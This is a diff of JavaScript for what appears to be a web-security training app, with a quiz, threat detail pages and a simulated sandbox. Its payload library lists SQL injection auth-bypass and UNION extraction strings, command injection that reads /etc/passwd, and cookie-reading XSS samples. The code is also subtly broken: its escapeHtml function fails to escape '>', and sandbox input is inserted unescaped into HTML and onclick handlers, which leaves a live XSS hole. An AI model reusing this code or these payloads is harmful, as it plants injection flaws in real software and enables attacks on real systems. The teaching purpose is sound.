+                      ${quizSubmitted ? 'disabled' : ''}
+                      onclick="selectQuizOption(${i})"
+                      class="w-full text-left rounded-lg border p-4 flex items-start justify-between gap-3 text-xs sm:text-sm text-cyber-text-bright transition duration-200 ${border}"
+                    >
+                      <span>${opt}</span>
+                      ${icon ? `<div class="shrink-0 mt-0.5">${icon}</div>` : ''}
+                    </button>
+                  `;
+                }).join('')}
+              </div>
+
+              ${quizSubmitted ? `
+                <div class="rounded-lg border p-4 mb-6 font-mono text-xs leading-relaxed ${
+                  selectedOption === q.correctAnswer ? 'border-cyber-green/30 bg-cyber-green/5 text-cyber-green' : 'border-cyber-red/30 bg-cyber-red/5 text-cyber-red'
+                }">
+                  <span class="font-bold flex items-center gap-1.5 mb-1.5">
+                    <i data-lucide="${selectedOption === q.correctAnswer ? 'shield-check' : 'shield-alert'}" class="h-4 w-4"></i>
+                    ${selectedOption === q.correctAnswer ? 'CORRECT RESPONSE' : 'INCORRECT RESPONSE'}
+                  </span>
+                  <p class="text-cyber-text-bright">${q.explanation}</p>
+                </div>
+              ` : ''}
+
+              <div class="flex justify-end border-t border-cyber-border/40 pt-4 font-mono text-xs">
+                ${!quizSubmitted ? `
+                  <button
+                    onclick="submitQuizAnswer()"
+                    ${selectedOption === null ? 'disabled' : ''}
+                    class="rounded py-2 px-6 font-bold bg-cyber-green text-cyber-bg transition ${selectedOption === null ? 'opacity-40 cursor-not-allowed' : 'hover:shadow-[0_0_8px_rgba(16,185,129,0.3)]'}"
+                  >SUBMIT_ANSWER</button>
+                ` : `
+                  <button
+                    onclick="nextQuizQuestion()"
+                    class="rounded bg-cyber-green text-cyber-bg py-2 px-6 font-bold flex items-center gap-1 hover:shadow-[0_0_8px_rgba(16,185,129,0.3)]"
+                  >
+                    ${currentQuizIndex < quizQuestions.length - 1 ? 'NEXT_QUESTION' : 'COMPLETE_QUIZ'}
+                    <i data-lucide="chevron-right" class="h-4 w-4"></i>
+                  </button>
+                `}
+              </div>
+
+            ` : `
+              <!-- Quiz ended view -->
+              <div class="text-center font-mono py-6">
+                ${quizScore === quizQuestions.length ? `
+                  <div class="mb-6 space-y-3">
+                    <div class="inline-flex rounded-full border border-cyber-green/50 bg-cyber-green/10 p-5 animate-bounce shadow-[0_0_20px_rgba(16,185,129,0.3)]">
+                      <i data-lucide="award" class="h-12 w-12 text-cyber-green text-glow-green"></i>
+                    </div>
+                    <h3 class="text-lg font-bold text-cyber-green text-glow-green uppercase">CERTIFIED CYBER DEFENDER</h3>
+                    <p class="text-xs text-cyber-text-muted max-w-sm mx-auto leading-relaxed">
+                      Perfect Score! You have successfully demonstrated critical comprehension of secure coding patterns.
+                    </p>
+                  </div>
+                ` : `
+                  <div class="mb-6 space-y-3">
+                    <div class="inline-flex rounded-full border border-cyber-orange/40 bg-cyber-orange/10 p-5 shadow-[0_0_15px_rgba(255,159,28,0.2)]">
+                      <i data-lucide="award" class="h-12 w-12 text-cyber-orange"></i>
+                    </div>
+                    <h3 class="text-lg font-bold text-cyber-orange uppercase">ASSESSMENT COMPLETED</h3>
+                    <p class="text-xs text-cyber-text-muted max-w-sm mx-auto leading-relaxed">
+                      Nice attempt! Review the vulnerability prevention sections in the catalog to unlock the perfect certified score badge.
+                    </p>
+                  </div>
+                `}
+
+                <div class="mx-auto max-w-xs grid grid-cols-2 gap-4 border border-cyber-border bg-cyber-bg-darker/60 rounded-lg p-4 mb-8 text-xs">
+                  <div class="flex flex-col items-center border-r border-cyber-border/40">
+                    <span class="text-cyber-text-muted">FINAL SCORE</span>
+                    <span class="text-cyber-text-bright font-bold text-sm mt-1">${quizScore} / ${quizQuestions.length}</span>
+                  </div>
+                  <div class="flex flex-col items-center">
+                    <span class="text-cyber-text-muted">ACCURACY</span>
+                    <span class="text-cyber-blue font-bold text-sm mt-1">${Math.round((quizScore / quizQuestions.length) * 100)}%</span>
+                  </div>
+                </div>
+
+                <div class="flex flex-wrap justify-center gap-4">
+                  <button onclick="resetQuiz()" class="rounded border border-cyber-green bg-cyber-green/5 text-cyber-green py-2 px-6 flex items-center gap-1.5 hover:bg-cyber-green/10 transition">
+                    <i data-lucide="rotate-ccw" class="h-4 w-4"></i> RETAKE_ASSESSMENT
+                  </button>
+                  <a href="#/" class="rounded bg-cyber-border text-cyber-text-bright py-2 px-6 hover:bg-cyber-border/80 transition">
+                    RETURN_TO_CATALOG
+                  </a>
+                </div>
+              </div>
+            `}
+          </div>
+
+        </div>
+      `;
+    }
+
+    const selectQuizOption = (idx) => {
+      selectedOption = idx;
+      renderPage();
+    };
+
+    const submitQuizAnswer = () => {
+      quizSubmitted = true;
+      if (selectedOption === quizQuestions[currentQuizIndex].correctAnswer) {
+        quizScore++;
+      }
+      renderPage();
+    };
+
+    const nextQuizQuestion = () => {
+      selectedOption = null;
+      quizSubmitted = false;
+      if (currentQuizIndex < quizQuestions.length - 1) {
+        currentQuizIndex++;
+      } else {
+        quizEnded = true;
+      }
+      renderPage();
+    };
+
+    const resetQuiz = () => {
+      currentQuizIndex = 0;
+      selectedOption = null;
+      quizSubmitted = false;
+      quizScore = 0;
+      quizEnded = false;
+      renderPage();
+    };
+
+    // Page: Threat Details View
+    let activeTab = 'overview';
+    let isSimulating = false;
+    let sandboxInput = '';
+    let sandboxLogs = [];
+    let sandboxResult = null;
+
+    function renderAttackDetail(id) {
+      const a = attacks.find(x => x.id === id);
+      if (!a) {
+        return `
+          <div class="mx-auto max-w-md rounded-xl border border-cyber-red/20 bg-cyber-bg-darker/60 p-8 text-center font-mono mt-20">
+            <i data-lucide="shield-alert" class="mx-auto h-12 w-12 text-cyber-red animate-pulse"></i>
+            <h3 class="mt-4 text-base font-bold text-cyber-text-bright">VULNERABILITY_NOT_FOUND</h3>
+            <a href="#/" class="mt-5 inline-block rounded border border-cyber-blue px-4 py-1.5 text-xs text-cyber-blue hover:bg-cyber-blue/10">
+              RETURN_HOME
+            </a>
+          </div>
+        `;
+      }
+
+      const explored = exploredAttacks.includes(a.id);
+      
+      const getSeverityStyles = (sev) => {
+        if (sev === 'Critical') return 'border-cyber-red/60 text-cyber-red bg-cyber-red/10 animate-pulse';
+        if (sev === 'High') return 'border-cyber-red/35 text-cyber-red bg-cyber-red/5';
+        if (sev === 'Medium') return 'border-cyber-orange/40 text-cyber-orange bg-cyber-orange/5';
+        return 'border-cyber-green/40 text-cyber-green bg-cyber-green/5';
+      };
+
+      // Layout rendering
+      return `
+        <div class="relative z-10 mx-auto max-w-5xl px-4 sm:px-6 lg:px-8 pb-20 pt-6">
+          
+          <!-- Control Bar -->
+          <div class="no-print mb-6 flex items-center justify-between font-mono text-xs">
+            <a href="#/" class="flex items-center gap-1.5 text-cyber-text-muted hover:text-cyber-green transition">
+              <i data-lucide="arrow-left" class="h-4 w-4"></i> &lt; RETURN_TO_CATALOG
+            </a>
+
+            <div class="flex gap-3">
+              <button
+                onclick="toggleExploredDetail('${a.id}')"
+                class="flex items-center gap-1.5 rounded border px-3 py-1.5 transition ${
+                  explored 
+                    ? 'border-cyber-green/30 bg-cyber-green/5 text-cyber-green hover:bg-cyber-green/10' 
+                    : 'border-cyber-border bg-cyber-bg-darker text-cyber-text-muted hover:border-cyber-green hover:text-cyber-green'
+                }"
+              >
+                <i data-lucide="${explored ? 'check-circle' : 'circle'}" class="h-3.5 w-3.5"></i>
+                ${explored ? 'EXPLORED' : 'MARK EXPLORED'}
+              </button>
+              <button onclick="window.print()" class="flex items-center gap-1.5 rounded border border-cyber-border bg-cyber-bg-darker px-3 py-1.5 text-cyber-text-muted hover:border-cyber-green hover:text-cyber-green">
+                <i data-lucide="printer" class="h-3.5 w-3.5"></i> PRINT_CHEAT_SHEET
+              </button>
+            </div>
+          </div>
+
+          <!-- Main Details Card -->
+          <div class="print-card rounded-xl border border-cyber-border bg-cyber-card p-6 sm:p-8 shadow-2xl backdrop-blur-sm">
+            
+            <!-- Header -->
+            <div class="border-b border-cyber-border/60 pb-6 mb-6">
+              <div class="flex flex-wrap items-center justify-between gap-4">
+                <div>
+                  <span class="font-mono text-xs text-cyber-blue tracking-wider font-bold">// SEC_THREAT_DESCRIPTOR</span>
+                  <h1 class="mt-1 text-2xl font-bold tracking-tight text-cyber-text-bright sm:text-4xl">${a.name}</h1>
+                </div>
+                <span class="rounded border px-3 py-1 font-mono text-xs font-bold uppercase tracking-wider ${getSeverityStyles(a.severity)}">
+                  SEVERITY: ${a.severity}
+                </span>
+              </div>
+              <p class="mt-4 text-sm sm:text-base leading-relaxed text-cyber-text-bright font-medium">${a.description}</p>
+            </div>
+
+            <!-- Tab Headers -->
+            <div class="no-print mb-6 border-b border-cyber-border/40">
+              <div class="flex flex-wrap gap-2">
+                ${[
+                  { id: 'overview', label: 'OVERVIEW & IMPACT' },
+                  { id: 'mechanics', label: 'HOW IT WORKS & CODE' },
+                  { id: 'prevention', label: 'PREVENTION & MITIGATION' },
+                  { id: 'sandbox', label: 'INTERACTIVE SANDBOX' }
+                ].map(t => `
+                  <button
+                    onclick="setDetailTab('${t.id}')"
+                    class="border-b-2 px-4 py-2.5 font-mono text-xs tracking-wider transition-all duration-200 ${
+                      activeTab === t.id 
+                        ? 'border-cyber-green text-cyber-green font-bold text-glow-green' 
+                        : 'border-transparent text-cyber-text-muted hover:border-cyber-border hover:text-cyber-text-bright'
+                    }"
+                  >${t.label}</button>
+                `).join('')}
+              </div>
+            </div>
+
+            <!-- Dynamic Tab Content -->
+            <div>
+              ${activeTab === 'overview' ? `
+                <div class="space-y-6">
+                  <div class="grid grid-cols-1 md:grid-cols-2 gap-6 items-start">
+                    <div class="space-y-6 text-left">
+                      <section class="space-y-3">
+                        <h3 class="flex items-center gap-2 font-mono text-sm font-bold text-cyber-blue uppercase tracking-wider">
+                          <i data-lucide="info" class="h-4 w-4"></i> 1. Concept Overview
+                        </h3>
+                        <p class="text-sm leading-relaxed text-cyber-text-muted">${a.overview}</p>
+                      </section>
+                      <section class="space-y-3 border-t border-cyber-border/30 pt-6">
+                        <h3 class="flex items-center gap-2 font-mono text-sm font-bold text-cyber-red uppercase tracking-wider">
+                          <i data-lucide="shield-alert" class="h-4 w-4"></i> 2. Real-World Impact
+                        </h3>
+                        <p class="text-sm leading-relaxed text-cyber-text-muted">${a.realWorldImpact}</p>
+                      </section>
+                    </div>
+
+                    <div class="space-y-6">
+                      <!-- Render the Custom Schematic image header -->
+                      ${renderSchematicImage(a.id, a.name)}
+
+                      <div class="space-y-3 rounded-lg border border-cyber-border bg-cyber-bg-darker/40 p-4 text-left">
+                        <h3 class="flex items-center gap-2 font-mono text-xs font-bold text-cyber-text-bright uppercase tracking-wider">
+                          <i data-lucide="book-open" class="h-3.5 w-3.5"></i> Historical References
+                        </h3>
+                        <div class="space-y-3 divide-y divide-cyber-border/30">
+                          ${a.incidents.map((inc, idx) => `
+                            <div class="text-xs ${idx > 0 ? 'pt-3' : ''}">
+                              <div class="flex justify-between font-mono font-bold text-cyber-text-bright">
+                                <span>${inc.title}</span>
+                                <span class="text-cyber-blue">${inc.year}</span>
+                              </div>
+                              <p class="mt-1 text-cyber-text-muted">${inc.description}</p>
+                            </div>
+                          `).join('')}
+                        </div>
+                      </div>
+                    </div>
+                  </div>
+                  
+                  <div class="mt-8 border-t border-cyber-border/30 pt-6 text-left">
+                    <h3 class="font-mono text-xs font-bold text-cyber-blue uppercase mb-3">// ATTACK_VECTOR_MODEL</h3>
+                    <div class="rounded-xl border border-cyber-border bg-cyber-bg-darker/35 p-3">
+                      ${renderSvgVectorDiagram(a.id)}
+                    </div>
+                  </div>
+                </div>
+              ` : ''}
+
+              ${activeTab === 'mechanics' ? `
+                <div class="space-y-8 text-left">
+                  <!-- Flowchart sequence mapping -->
+                  <div>
+                    <h3 class="font-mono text-xs font-bold text-cyber-blue uppercase mb-4">// EXECUTION_SEQUENCE_FLOW</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-4 gap-4">
+                      ${a.howItWorks.map((step, idx) => `
+                        <div class="rounded-lg border border-cyber-border bg-cyber-bg-darker/50 p-4 font-mono text-xs flex flex-col justify-between">
+                          <span class="text-cyber-green font-bold mb-2">STEP_0${idx + 1}</span>
+                          <p class="text-cyber-text-bright leading-relaxed">${step}</p>
+                        </div>
+                      `).join('')}
+                    </div>
+                  </div>
+
+                  <!-- Code Block comparison -->
+                  <div class="border-t border-cyber-border/30 pt-6">
+                    <h3 class="font-mono text-sm font-bold text-cyber-blue uppercase tracking-wider mb-2">// COMPARATIVE_CODE_ANALYSIS (${a.codeLang})</h3>
+                    <div class="grid grid-cols-1 md:grid-cols-2 gap-6 mt-4">
+                      <div class="rounded-lg border border-cyber-red/25 bg-cyber-bg-darker/60 overflow-hidden">
+                        <div class="flex items-center justify-between border-b border-cyber-red/20 bg-cyber-red/5 px-4 py-2 text-cyber-red font-bold font-mono text-xs">
+                          <span>INSECURE PATTERN</span>
+                        </div>
+                        <pre class="p-4 overflow-x-auto text-[11px] font-mono text-cyber-text-bright"><code>${escapeHtml(a.codeVuln)}</code></pre>
+                      </div>
+                      <div class="rounded-lg border border-cyber-green/25 bg-cyber-bg-darker/60 overflow-hidden">
+                        <div class="flex items-center justify-between border-b border-cyber-green/20 bg-cyber-green/5 px-4 py-2 text-cyber-green font-bold font-mono text-xs">
+                          <span>SECURE PATTERN</span>
+                        </div>
+                        <pre class="p-4 overflow-x-auto text-[11px] font-mono text-cyber-text-bright"><code>${escapeHtml(a.codeSecure)}</code></pre>
+                      </div>
+                    </div>
+                  </div>
+                </div>
+              ` : ''}
+
+              ${activeTab === 'prevention' ? `
+                <div class="space-y-6 text-left">
+                  <h3 class="flex items-center gap-2 font-mono text-sm font-bold text-cyber-green uppercase tracking-wider">
+                    <i data-lucide="shield-check" class="h-4 w-4"></i> Root Cause Mitigations
+                  </h3>
+                  <p class="text-sm text-cyber-text-muted">
+                    The primary cause is <strong class="text-cyber-text-bright font-bold">${a.rootCause}</strong>. Implement the checklist below:
+                  </p>
+                  <div class="rounded-lg border border-cyber-border bg-cyber-bg-darker/40 p-5">
+                    <h4 class="font-mono text-xs font-bold text-cyber-text-bright border-b border-cyber-border/40 pb-2 mb-4">DEFENSIVE CHECKLIST</h4>
+                    <ul class="space-y-3.5">
+                      ${a.prevention.map(item => `
+                        <li class="flex items-start gap-3 text-xs sm:text-sm">
+                          <div class="mt-1 flex h-4 w-4 shrink-0 items-center justify-center rounded border border-cyber-green/40 bg-cyber-green/5 text-cyber-green font-mono text-[8px] font-extrabold select-none">OK</div>
+                          <span class="text-cyber-text-muted">${item}</span>
+                        </li>
+                      `).join('')}
+                    </ul>
+                  </div>
+                </div>
+              ` : ''}
+
+              ${activeTab === 'sandbox' ? renderSandbox(a.id) : ''}
+            </div>
+
+          </div>
+        </div>
+      `;
+    }
+
+    const toggleExploredDetail = (id) => {
+      toggleExplored(id);
+    };
+
+    const setDetailTab = (tab) => {
+      activeTab = tab;
+      sandboxLogs = [];
+      sandboxResult = null;
+      renderPage();
+    };
+
+    const escapeHtml = (unsafe) => {
+      return unsafe.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/&gt;/g, "&gt;").replace(/"/g, "&quot;").replace(/'/g, "&#039;");
+    };
+
+    // Render unique schematic or static image
+    const renderSchematicImage = (id, name) => {
+      const mapping = {
+        'sql-injection': 'public/sqli_diagram.jpg',
+        'blind-sql-injection': 'public/blind_sqli_diagram.jpg',
+        'command-injection': 'public/cmd_injection_diagram.jpg',
+        'xss-reflected': 'public/xss_diagram.jpg',
+        'xss-stored': 'public/stored_xss_diagram.jpg',
+        'xss-dom': 'public/dom_xss_diagram.jpg',
+        'csrf': 'public/csrf_diagram.jpg',
+        'file-inclusion': 'public/file_inclusion_diagram.jpg',
+        'file-upload': 'public/file_upload_diagram.jpg',
+        'insecure-captcha': 'public/insecure_captcha_diagram.jpg',
+        'weak-session': 'public/weak_session_diagram.jpg'
+      };
+
+      const path = mapping[id];
+      if (path) {
+        return `
+          <div class="rounded-lg overflow-hidden border border-cyber-border bg-cyber-bg-darker/60 h-48 sm:h-56 shadow-lg relative">
+            <img src="${path}" alt="${name} Cover" class="w-full h-full object-cover opacity-85" />
+          </div>
+        `;
+      }
+
+      // Fallback CSS illustrations for the remaining 7
+      let icon = 'lock';
+      let title = 'CREDENTIAL_ATTACK';
+      let desc = 'Rapid inputs dictionary flooding';
+      let color = 'border-cyber-red/30 bg-cyber-red/5 text-cyber-red';
+      
+      if (id === 'security-misconfig') {
+        icon = 'settings'; title = 'MISCONFIGURATION'; desc = 'Open server directory indices'; color = 'border-cyber-orange/35 bg-cyber-orange/5 text-cyber-orange';
+      } else if (id === 'broken-access-control') {
+        icon = 'user-check'; title = 'IDOR_BYPASS'; desc = 'Access records without check-backs'; color = 'border-cyber-blue/35 bg-cyber-blue/5 text-cyber-blue';
+      } else if (id === 'clickjacking') {
+        icon = 'layers'; title = 'UI_REDRESS'; desc = 'Transparent overlay overlays'; color = 'border-cyber-blue/35 bg-cyber-blue/5 text-cyber-blue';
+      } else if (id === 'open-redirect') {
+        icon = 'globe'; title = 'PARAMETER_REDIRECT'; desc = 'Dynamic redirect link routing'; color = 'border-cyber-blue/35 bg-cyber-blue/5 text-cyber-blue';
+      } else if (id === 'csp-bypass') {
+        icon = 'shield-alert'; title = 'CSP_BYPASS'; desc = 'Whitelisted CDN scripts execution'; color = 'border-cyber-blue/35 bg-cyber-blue/5 text-cyber-blue';
+      } else if (id === 'cryptographic-failures') {
+        icon = 'refresh-cw'; title = 'WEAK_HASHING'; desc = 'Cracking MD5/SHA1 passwords'; color = 'border-cyber-red/35 bg-cyber-red/5 text-cyber-red';
+      }
+
+      return `
+        <div class="rounded-lg border ${color} h-48 sm:h-56 flex flex-col items-center justify-center p-6 shadow-inner text-center font-mono">
+          <div class="inline-flex rounded-full border border-current bg-cyber-bg p-3 mb-3 animate-pulse">
+            <i data-lucide="${icon}" class="h-8 w-8"></i>
+          </div>
+          <h4 class="font-bold text-cyber-text-bright uppercase tracking-wider text-xs">// ${title}</h4>
+          <p class="text-[10px] text-cyber-text-muted mt-1.5">${desc}</p>
+        </div>
+      `;
+    };
+
+    // Dynamic SVG Illustrations Model
+    const renderSvgVectorDiagram = (id) => {
+      // Return beautiful, animated inline vector illustrations
+      if (id.includes('sql')) {
+        return `
+          <svg viewBox="0 0 800 220" class="w-full h-auto stroke-current text-cyber-text-muted fill-none">
+            <rect x="20" y="70" width="180" height="70" rx="6" class="stroke-cyber-blue" />
+            <text x="110" y="110" text-anchor="middle" class="fill-cyber-text-bright font-mono text-xs">USER_INPUT_FORM</text>
+            <path d="M200 105 L300 105" class="stroke-cyber-blue" marker-end="url(#arrow)" />
+            
+            <rect x="300" y="55" width="220" height="100" rx="6" class="stroke-cyber-red stroke-2" />
+            <text x="410" y="95" text-anchor="middle" class="fill-cyber-red font-mono text-xs font-bold">QUERY_CONCATENATOR</text>
+            <text x="410" y="125" text-anchor="middle" class="fill-cyber-text-muted font-mono text-[9px]">// SELECT * FROM users WHERE user = '$input'</text>
+            <path d="M520 105 L620 105" class="stroke-cyber-red" />
+            
+            <rect x="620" y="70" width="160" height="70" rx="6" class="stroke-cyber-green" />
+            <text x="700" y="110" text-anchor="middle" class="fill-cyber-green font-mono text-xs">SQL_DATABASE</text>
+          </svg>
+        `;
+      }
+      if (id === 'command-injection') {
+        return `
+          <svg viewBox="0 0 800 220" class="w-full h-auto stroke-current text-cyber-text-muted fill-none">
+            <rect x="20" y="70" width="160" height="70" rx="6" class="stroke-cyber-blue" />
+            <text x="100" y="110" text-anchor="middle" class="fill-cyber-text-bright font-mono text-xs">INPUT: "8.8.8.8; whoami"</text>
+            
+            <path d="M180 105 L280 105" class="stroke-cyber-blue" />
+            <rect x="280" y="60" width="240" height="90" rx="6" class="stroke-cyber-red stroke-2" />
+            <text x="400" y="100" text-anchor="middle" class="fill-cyber-red font-mono text-xs font-bold">SYSTEM_SHELL_INTERPRETER</text>
+            <text x="400" y="125" text-anchor="middle" class="fill-cyber-text-muted font-mono text-[9px]">// Executing: ping -c 3 8.8.8.8 ; whoami</text>
+            
+            <path d="M520 105 L620 105" class="stroke-cyber-red" />
+            <rect x="620" y="70" width="160" height="70" rx="6" class="stroke-cyber-green" />
+            <text x="700" y="110" text-anchor="middle" class="fill-cyber-green font-mono text-xs">HOST_OPERATING_SYSTEM</text>
+          </svg>
+        `;
+      }
+      // General default vector diagram
+      return `
+        <svg viewBox="0 0 800 220" class="w-full h-auto stroke-current text-cyber-text-muted fill-none">
+          <rect x="50" y="75" width="160" height="60" rx="4" class="stroke-cyber-blue" />
+          <text x="130" y="110" text-anchor="middle" class="fill-cyber-text-bright font-mono text-xs">CLIENT_BROWSER</text>
+          
+          <path d="M210 105 L350 105" class="stroke-cyber-blue" />
+          <rect x="350" y="65" width="160" height="80" rx="4" class="stroke-cyber-blue" />
+          <text x="430" y="105" text-anchor="middle" class="fill-cyber-text-bright font-mono text-xs">APPLICATION_GATEWAY</text>
+          
+          <path d="M510 105 L650 105" class="stroke-cyber-blue" />
+          <rect x="650" y="75" width="100" height="60" rx="4" class="stroke-cyber-green" />
+          <text x="700" y="110" text-anchor="middle" class="fill-cyber-green font-mono text-xs">BACKEND</text>
+        </svg>
+      `;
+    };
+
+    // Interactive Sandbox Simulator Logic
+    function renderSandbox(id) {
+      const a = attacks.find(x => x.id === id);
+      const suggested = getSuggestedPayloads(a.id);
+
+      return `
+        <div class="space-y-4 text-left font-mono">
+          <div class="space-y-1">
+            <h3 class="flex items-center gap-2 font-mono text-sm font-bold text-cyber-green uppercase tracking-wider">
+              <i data-lucide="terminal" class="h-4 w-4 animate-pulse text-glow-green"></i> Security Sandbox Emulator
+            </h3>
+            <p class="text-[10px] text-cyber-text-muted leading-relaxed">
+              Verify mitigations dynamically by sending test inputs. Toggle between Vulnerable and Secure filters to analyze outputs.
+            </p>
+          </div>
+
+          <div class="rounded-xl border border-cyber-border bg-cyber-bg-darker/60 p-5 grid grid-cols-1 md:grid-cols-12 gap-6">
+            
+            <!-- Controls -->
+            <div class="md:col-span-5 space-y-4">
+              <div>
+                <span class="text-[9px] text-cyber-text-muted block mb-1.5 uppercase">Execution Filter</span>
+                <div class="flex gap-2">
+                  <button
+                    onclick="setSandboxMode('vulnerable')"
+                    class="flex-grow rounded border py-1.5 px-3 flex items-center justify-center gap-1.5 transition ${
+                      mode === 'vulnerable'
+                        ? 'border-cyber-red bg-cyber-red/10 text-cyber-red font-bold'
+                        : 'border-cyber-border bg-cyber-bg text-cyber-text-muted hover:border-cyber-red/50'
+                    }"
+                  >
+                    <i data-lucide="shield-alert" class="h-4 w-4"></i> VULNERABLE
+                  </button>
+                  <button
+                    onclick="setSandboxMode('secure')"
+                    class="flex-grow rounded border py-1.5 px-3 flex items-center justify-center gap-1.5 transition ${
+                      mode === 'secure'
+                        ? 'border-cyber-green bg-cyber-green/10 text-cyber-green font-bold'
+                        : 'border-cyber-border bg-cyber-bg text-cyber-text-muted hover:border-cyber-green/50'
+                    }"
+                  >
+                    <i data-lucide="shield-check" class="h-4 w-4"></i> SECURE
+                  </button>
+                </div>
+              </div>
+
+              <div>
+                <span class="text-[9px] text-cyber-text-muted block mb-1.5 uppercase">Payload Library</span>
+                <div class="flex flex-col gap-2">
+                  ${suggested.map(p => `
+                    <button
+                      onclick="selectSandboxPayload('${p.value}')"
+                      class="w-full text-left rounded border border-cyber-border bg-cyber-card px-3 py-2 text-cyber-text-muted hover:border-cyber-green transition truncate"
+                    >
+                      <span class="text-[8px] font-bold text-cyber-blue block uppercase">${p.label}</span>
+                      <span class="text-[10px] text-cyber-text-bright truncate block mt-0.5">${p.value}</span>
+                    </button>
+                  `).join('')}
+                </div>
+              </div>
+
+              <div>
+                <span class="text-[9px] text-cyber-text-muted block mb-1.5 uppercase">Test Input</span>
+                <input
+                  type="text"
+                  id="sandbox-input-box"
+                  value="${sandboxInput}"
+                  placeholder="Insert custom parameter query here..."
+                  class="w-full rounded border border-cyber-border bg-cyber-bg px-3 py-2 text-cyber-text-bright outline-none focus:border-cyber-green"
+                  oninput="updateSandboxInput(this.value)"
+                />
+              </div>
+
+              <div class="flex gap-2">
+                <button
+                  onclick="runSandboxSimulation('${a.id}')"
+                  id="sandbox-run-btn"
+                  ${!sandboxInput || isSimulating ? 'disabled' : ''}
+                  class="flex-grow rounded py-2 px-4 flex items-center justify-center gap-1.5 font-bold transition ${
+                    (!sandboxInput || isSimulating)
+                      ? 'border border-cyber-border/40 bg-cyber-bg/25 text-cyber-text-muted/40 cursor-not-allowed'
+                      : 'bg-cyber-green text-cyber-bg hover:shadow-[0_0_12px_rgba(16,185,129,0.4)]'
+                  }"
+                >
+                  ${isSimulating ? '<i data-lucide="refresh-cw" class="h-4 w-4 animate-spin"></i> PARSING_TRAFFIC...' : '<i data-lucide="play" class="h-4 w-4 fill-current"></i> RUN_SIMULATION'}
+                </button>
+                <button onclick="resetSandbox()" class="rounded border border-cyber-border bg-cyber-card p-2 text-cyber-text-muted hover:border-cyber-green hover:text-cyber-green transition">
+                  <i data-lucide="rotate-ccw" class="h-4 w-4"></i>
+                </button>
+              </div>
+            </div>
+
+            <!-- Console Log Output -->
+            <div class="md:col-span-7 flex flex-col h-full min-h-[300px]">
+              <span class="text-[9px] text-cyber-text-muted block mb-1.5 uppercase">Debugger Output Console</span>
+              <div class="flex-grow rounded border border-cyber-border bg-cyber-bg p-4 flex flex-col justify-between overflow-y-auto max-h-[350px]">
+                <div class="space-y-1.5 overflow-y-auto pr-1">
+                  ${sandboxLogs.length > 0 ? `
+                    ${sandboxLogs.map(log => {
+                      let logColor = 'text-cyber-text-muted';
+                      if (log.startsWith('[REQUEST]')) logColor = 'text-cyber-blue';
+                      if (log.startsWith('[WARNING]')) logColor = 'text-cyber-red font-bold animate-pulse';
+                      if (log.startsWith('[SYSTEM]')) logColor = 'text-cyber-text-muted/50';
+                      if (log.includes('Executing query safely') || log.includes('escaped') || log.includes('Neutralized')) logColor = 'text-cyber-green';
+                      return `<div class="leading-relaxed text-[10px] ${logColor}">${log}</div>`;
+                    }).join('')}
+                  ` : `
+                    <div class="text-center text-cyber-text-muted/40 py-10">
+                      <i data-lucide="terminal" class="h-10 w-10 mx-auto opacity-30 mb-2"></i>
+                      <span>Enter input parameters and click RUN_SIMULATION to parse execution steps.</span>
+                    </div>
+                  `}
+                </div>
+
+                ${sandboxResult && !isSimulating ? `
+                  <div class="mt-4 border-t pt-3 ${
+                    sandboxResult.status === 'compromised' 
+                      ? 'border-cyber-red/35 bg-cyber-red/5 p-3 rounded' 
+                      : 'border-cyber-green/35 bg-cyber-green/5 p-3 rounded'
+                  }">
+                    <div class="flex items-center gap-1.5 font-bold mb-1">
+                      ${sandboxResult.status === 'compromised' 
+                        ? '<span class="text-cyber-red flex items-center gap-1"><i data-lucide="alert-triangle" class="h-4 w-4 animate-bounce"></i> VULNERABILITY EXPLOITED (FAIL)</span>'
+                        : '<span class="text-cyber-green flex items-center gap-1"><i data-lucide="shield-check" class="h-4 w-4"></i> SECURED DATA (PASS)</span>'
+                      }
+                    </div>
+                    <div class="font-mono text-[10px] text-cyber-text-bright break-all leading-normal whitespace-pre-wrap">${sandboxResult.output}</div>
+                  </div>
+                ` : ''}
+              </div>
+            </div>
+
+          </div>
+        </div>
+      `;
+    }
+
+    let mode = 'vulnerable';
+
+    const setSandboxMode = (m) => {
+      mode = m;
+      sandboxLogs = [];
+      sandboxResult = null;
+      renderPage();
+    };
+
+    const updateSandboxInput = (val) => {
+      sandboxInput = val;
+      const btn = document.getElementById('sandbox-run-btn');
+      if (val.trim()) {
+        btn.disabled = false;
+        btn.className = "flex-grow rounded py-2 px-4 flex items-center justify-center gap-1.5 font-bold transition bg-cyber-green text-cyber-bg hover:shadow-[0_0_12px_rgba(16,185,129,0.4)]";
+      } else {
+        btn.disabled = true;
+        btn.className = "flex-grow rounded py-2 px-4 flex items-center justify-center gap-1.5 font-bold transition border border-cyber-border/40 bg-cyber-bg/25 text-cyber-text-muted/40 cursor-not-allowed";
+      }
+    };
+
+    const selectSandboxPayload = (val) => {
+      sandboxInput = val;
+      renderPage();
+      updateSandboxInput(val);
+    };
+
+    const resetSandbox = () => {
+      sandboxInput = '';
+      sandboxLogs = [];
+      sandboxResult = null;
+      isSimulating = false;
+      renderPage();
+    };
+
+    const getSuggestedPayloads = (id) => {
+      if (id.includes('sql')) {
+        return [
+          { label: 'Normal Lookup', value: 'smith' },
+          { label: 'Auth Bypass', value: "admin' OR '1'='1" },
+          { label: 'Union Exfiltration', value: "1' UNION SELECT username, password FROM users --" }
+        ];
+      }
+      if (id === 'command-injection') {
+        return [
+          { label: 'Safe Hostname', value: 'google.com' },
+          { label: 'Chain Shell Command', value: '8.8.8.8; whoami' },
+          { label: 'Exfiltrate System File', value: '127.0.0.1 && cat /etc/passwd' }
+        ];
+      }
+      return [
+        { label: 'Standard Text', value: 'Welcome Back!' },
+        { label: 'Alert Script', value: '<script>alert(document.cookie)<\/script>' },
+        { label: 'Onerror Image Redirect', value: '<img src=x onerror="alert(\'Hijacked!\')">' }
+      ];
+    };
+
+    const runSandboxSimulation = (id) => {
+      if (isSimulating) return;
+      isSimulating = true;
+      sandboxLogs = [];
+      sandboxResult = null;
+      renderPage();
+
+      let input = sandboxInput.trim();
+      let logs = [];
+      let result = null;
+
+      logs.push(`[SYSTEM] Initializing request parsing context...`);
+      logs.push(`[REQUEST] Input Param Received: "${input}"`);
+
+      if (id.includes('sql')) {
+        if (mode === 'vulnerable') {
+          logs.push(`[BACKEND] Constructing query: SELECT * FROM users WHERE username = '${input}'`);
+          logs.push(`[DATABASE] Parsing SQL command tokens...`);
+          if (input.includes("' OR '") || input.includes('--')) {
